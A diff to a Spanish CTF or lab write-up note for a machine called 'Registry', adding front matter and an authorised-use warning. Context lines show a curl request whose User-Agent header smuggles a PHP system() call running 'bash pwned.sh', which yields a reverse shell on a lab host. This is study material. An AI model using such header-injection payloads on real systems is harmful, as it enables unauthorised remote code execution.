@@ -1,3 +1,15 @@
+---
+title: "MAQUINA REGISTRY"
+date: 2026-08-27
+tags:
+  - self-study
+  - security-penetration-testing
+  - avanzado
+status: verified
+author: "Juan José Restrepo Rosero"
+last_updated: 2026-08-27
+---
+
 Hacemos un escaneo con nmap:
 ![[Pasted image 20230826174126.png]]
 Y esta es la página web:
@@ -52,3 +64,10 @@ curl -s -X GET 'http://192.168.0.42' -H "User-Agent: <?php system('bash pwned.sh
 Y recibimos la reverse shell:
 ![[Pasted image 20230828120606.png]]
 Una vez dentro, vemos que tenemos 3 carpetas pero no tenemos permiso para acceder a ninguna de ellas:
+
+<!-- self-study-knowledge-context -->
+## Contexto de estudio
+- Dominio: [[MOC-Self-Study#Security & Penetration Testing|Seguridad y pruebas de penetración]].
+- Criterio de producción: Ejecuta técnicas únicamente en activos propios o con autorización explícita, alcance documentado y controles de no afectación.
+> [!warning] Uso autorizado
+> Este material es exclusivamente educativo y defensivo. Practica en laboratorios aislados, CTFs o sistemas para los que dispongas de autorización previa y explícita.
